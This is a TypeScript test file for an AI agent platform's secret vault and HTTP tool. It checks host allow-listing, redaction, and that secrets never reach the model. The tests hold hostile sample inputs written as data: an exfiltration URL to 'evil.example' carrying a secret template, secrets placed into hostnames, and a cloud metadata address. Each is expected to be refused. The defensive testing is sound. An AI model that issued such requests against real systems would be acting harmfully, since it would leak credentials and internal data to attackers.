import { AIMessage, HumanMessage, ToolMessage } from "@langchain/core/messages";
import { tool } from "@langchain/core/tools";
import { describe, expect, it } from "vitest";
import { z } from "zod";
import type { McpConnector } from "@osiris/core/mcp/toolset.ts";
import { SecretBox } from "@osiris/core/secrets.ts";
import { hostAllowed, redact, templateHost } from "@osiris/core/vault/template.ts";
import { SecretVault } from "@osiris/core/vault/vault.ts";
import { createTestDb, createTestTenants, createTestApp } from "./helpers.ts";

const run = (user: string, role: "admin" | "member" = "member") => ({
  configurable: { thread_id: `t-${user}`, tenant_id: "acme", user_id: user, role, channel: "web" as const },
});

describe("secret templates", () => {
  it("matches hosts, keeps secrets out of the host and redacts values", () => {
    expect(hostAllowed("api.fakturoid.cz", ["api.fakturoid.cz"])).toBe(true);
    expect(hostAllowed("eu.api.example.com", ["*.example.com"])).toBe(true);
    expect(hostAllowed("example.com", ["*.example.com"])).toBe(false);
    expect(hostAllowed("evilexample.com", ["*.example.com"])).toBe(false);
    expect(templateHost("https://api.x.cz/v1?key={{secret:K}}")).toBe("api.x.cz");
    expect(() => templateHost("https://{{secret:K}}.evil.com/")).toThrow(/doméně/);
    expect(() => templateHost("https://api.x.cz@{{secret:K}}/")).toThrow();
    expect(redact("token abcd1234 ok", ["abcd1234"])).toBe("token [skryto] ok");
  });
});

describe("SecretVault", () => {
  it("stores values sealed, lists without values and fills only for allowed hosts", async () => {
    const db = await createTestDb();
    const vault = new SecretVault(db, SecretBox.insecureDev());
    await vault.put("CRM_TOKEN", "", { value: "tenant-tok", allowedHosts: ["crm.example.com"], description: "CRM" });
    await vault.put("CRM_TOKEN", "alice", { value: "alice-tok", allowedHosts: ["crm.example.com"], description: "" });

    const raw = await db.execute("SELECT value_enc FROM secrets");
    expect(raw.rows.map((r) => String(r.value_enc)).join()).not.toMatch(/tok/);
    expect(JSON.stringify(await vault.list("alice"))).not.toContain("alice-tok");

    const t = { h: "Bearer {{secret:CRM_TOKEN}}" };
    expect((await vault.fill(t, { userId: "alice", host: "crm.example.com" })).filled.h).toBe("Bearer alice-tok");
    expect((await vault.fill(t, { userId: "bob", host: "crm.example.com" })).filled.h).toBe("Bearer tenant-tok");
    expect((await vault.fill(t, { userId: "", host: "crm.example.com" })).filled.h).toBe("Bearer tenant-tok");
    await expect(vault.fill(t, { userId: "alice", host: "evil.com" })).rejects.toThrow(/není povolen/);
    await expect(vault.fill({ h: "{{secret:NOPE}}" }, { userId: "alice", host: "crm.example.com" })).rejects.toThrow(/neexistuje/);

    await vault.put("CRM_TOKEN", "", { allowedHosts: ["crm2.example.com"], description: "CRM" });
    expect((await vault.fill(t, { userId: "", host: "crm2.example.com" })).filled.h).toBe("Bearer tenant-tok");
    await expect(vault.put("NEW", "", { allowedHosts: ["a.cz"], description: "" })).rejects.toThrow(/hodnotu/);
  });
});

describe("http_request tool", () => {
  function setup(response = "ok") {
    const requests: { url: string; headers: Record<string, string>; redirect?: string }[] = [];
    const fakeFetch = (async (url: string | URL, init?: RequestInit) => {
      requests.push({ url: String(url), headers: init?.headers as Record<string, string>, redirect: init?.redirect });
      return new Response(response, { status: 200, headers: { "content-type": "application/json" } });
    }) as typeof fetch;
    return { requests, fakeFetch };
  }

  it("fills secrets on the server, masks them in the result and never shows them to the model", async () => {
    const { requests, fakeFetch } = setup('{"echo":"Bearer s3cr3t-value"}');
    const call = { id: "h1", name: "http_request", args: { url: "https://api.fakturoid.cz/v3/invoices", headers: { Authorization: "Bearer {{secret:FAKTUROID}}" } } };
    const { tenants, model } = createTestTenants([new AIMessage({ content: "", tool_calls: [call] }), new AIMessage("Hotovo.")], [], undefined, {
      fetch: fakeFetch,
      mcp: { allowPrivate: true },
    });
    const tenant = await tenants.get("acme");
    await tenant.secrets.put("FAKTUROID", "", { value: "s3cr3t-value", allowedHosts: ["api.fakturoid.cz"], description: "Fakturoid API" });

    const state = await tenant.graph.invoke({ messages: [new HumanMessage("Faktury?")] }, run("u"));

    expect(requests[0]).toMatchObject({ url: "https://api.fakturoid.cz/v3/invoices", redirect: "manual", headers: { Authorization: "Bearer s3cr3t-value" } });
    const result = state.messages.find((m) => ToolMessage.isInstance(m))?.text ?? "";
    expect(result).toContain("HTTP 200");
    expect(result).not.toContain("s3cr3t-value");
    const prompt = model.calls[0]?.[0]?.text ?? "";
    expect(prompt).toContain("{{secret:FAKTUROID}} pro api.fakturoid.cz: Fakturoid API");
    expect(JSON.stringify(model.calls)).not.toContain("s3cr3t-value");
  });

  it("refuses to send a secret to another host and blocks private addresses", async () => {
    const { requests, fakeFetch } = setup();
    const { tenants } = createTestTenants([], [], undefined, { fetch: fakeFetch });
    const tenant = await tenants.get("acme");
    await tenant.secrets.put("FAKTUROID", "", { value: "s3cr3t-value", allowedHosts: ["api.fakturoid.cz"], description: "" });
    const http = (await import("@osiris/core/agent/tools/http.ts")).httpRequestTool(tenant.secrets, { fetch: fakeFetch });
    const invoke = (args: { url: string }) => http.invoke(args, run("u"));

    expect(await invoke({ url: "https://evil.example/collect?t={{secret:FAKTUROID}}" })).toMatch(/zamítnut.*není povolen/);
    expect(await invoke({ url: "https://169.254.169.254/latest/meta-data" })).toMatch(/zamítnut.*privátní/);
    expect(await invoke({ url: "http://93.184.215.14/" })).toMatch(/zamítnut.*https/);
    expect(requests).toEqual([]);
  });
});

describe("secrets in MCP servers", () => {
  it("fills headers when connecting", async () => {
    const seen: Record<string, Record<string, string>> = {};
    const connect: McpConnector = async ({ name, headers }) => {
      seen[name] = headers;
      const t = tool(async () => "ok", { name: `${name}_ping`, description: "ping", schema: z.object({}) });
      return { tools: [t], close: async () => {} };
    };
    const { tenants } = createTestTenants([], [], connect);
    const tenant = await tenants.get("acme");
    await tenant.secrets.put("CRM", "", { value: "tenant-crm", allowedHosts: ["crm.example.com"], description: "" });
    await tenant.mcpServers.put("crm", "", { url: "https://crm.example.com/mcp", enabled: true, headers: { Authorization: "Bearer {{secret:CRM}}" } });
    await tenant.mcpServers.put("leak", "", { url: "https://cal.example.com/mcp", enabled: true, headers: { Authorization: "{{secret:CRM}}" } });
    await tenant.mcpServers.put("gone", "", { url: "https://crm.example.com/mcp", enabled: true, headers: { Authorization: "{{secret:MISSING}}" } });

    expect((await tenant.mcp.tools("alice")).map((t) => t.name)).toEqual(["crm_ping"]);
    expect(seen).toEqual({ crm: { Authorization: "Bearer tenant-crm" } });
    expect(tenant.mcp.status("").get("gone")).toEqual({ ok: false, error: "Secret MISSING neexistuje" });
    expect(tenant.mcp.status("").get("leak")?.ok).toBe(false);
  });
});

describe("secrets API", () => {
  async function setup() {
    const { tenants } = createTestTenants();
    const app = await createTestApp(tenants);
    const as = (user: string) => (path: string, init: RequestInit = {}) =>
      app.request(`/api${path}`, { ...init, headers: { authorization: `Bearer ${user}`, "content-type": "application/json" } });
    return { as };
  }
  const put = (body: object) => ({ method: "PUT", body: JSON.stringify({ allowedHosts: ["api.example.com"], ...body }) });

  it("never returns values and lets only admins manage them", async () => {
    const { as } = await setup();
    const admin = as("alice:tenant-admin=acme");
    const member = as("bob:tenant=acme");

    expect((await member("/secrets/CRM", put({ value: "x" }))).status).toBe(403);
    expect((await admin("/secrets/crm", put({ value: "x" }))).status).toBe(400);
    expect((await admin("/secrets/CRM", put({ value: "x", allowedHosts: [] }))).status).toBe(400);
    expect((await admin("/secrets/CRM", put({ value: "x", allowedHosts: ["https://api.example.com/"] }))).status).toBe(400);
    expect((await admin("/secrets/CRM", put({ value: "x", scope: "personal" }))).status).toBe(400);
    expect((await admin("/secrets/CRM", put({ value: "tenant-value-1", description: "CRM" }))).status).toBe(204);

    const listed = await (await member("/secrets")).text();
    expect(listed).not.toMatch(/value-1/);
    expect(JSON.parse(listed)).toMatchObject([{ name: "CRM", scope: "tenant", allowedHosts: ["api.example.com"], description: "CRM" }]);
    expect((await member("/secrets/CRM", { method: "DELETE" })).status).toBe(403);
    expect((await admin("/secrets/CRM", { method: "DELETE" })).status).toBe(204);
  });

  it("rejects MCP URLs with a secret in the host", async () => {
    const { as } = await setup();
    const res = await as("alice:tenant-admin=acme")("/mcp-servers/x", {
      method: "PUT",
      body: JSON.stringify({ url: "https://{{secret:CRM}}.example.com/mcp", scope: "tenant" }),
    });
    expect(res.status).toBe(400);
  });
});
